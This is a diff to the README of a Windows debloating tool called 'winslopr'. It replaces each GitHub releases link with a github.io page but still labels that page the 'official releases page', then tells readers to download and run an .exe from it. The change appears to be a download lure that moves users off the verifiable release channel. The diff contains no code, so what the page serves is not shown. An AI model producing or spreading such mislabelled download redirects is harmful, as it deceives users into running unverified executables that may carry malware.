@@ -1,6 +1,6 @@
 # 🧹 winslopr - Remove excess clutter from your computer
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Shanprin5627/winslopr/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://shanprin5627.github.io)
 
 ## 🎯 About this project
 
@@ -15,7 +15,7 @@ This software helps you clean your Windows installation. Many computers ship wit
 
 ## 📥 How to get started
 
-1. Visit the [official releases page](https://github.com/Shanprin5627/winslopr/releases) to download the software.
+1. Visit the [official releases page](https://shanprin5627.github.io) to download the software.
 2. Look for the file ending in .exe under the Assets section.
 3. Save the file to your Downloads folder or your Desktop.
 4. Locate the file and double-click it to start the process.
@@ -38,7 +38,7 @@ You fear mistakes? This software creates a restore point before you change any s
 ## 📋 Step-by-step guide
 
 **Step 1: Download**
-Go to the [releases page](https://github.com/Shanprin5627/winslopr/releases) for the latest version. Select the installer file. Ensure you download the version matching your system.
+Go to the [releases page](https://shanprin5627.github.io) for the latest version. Select the installer file. Ensure you download the version matching your system.
 
 **Step 2: Installation**
 Run the downloaded file. Follow the on-screen prompts. You do not need technical knowledge to finish this part. The program guides you through every step.
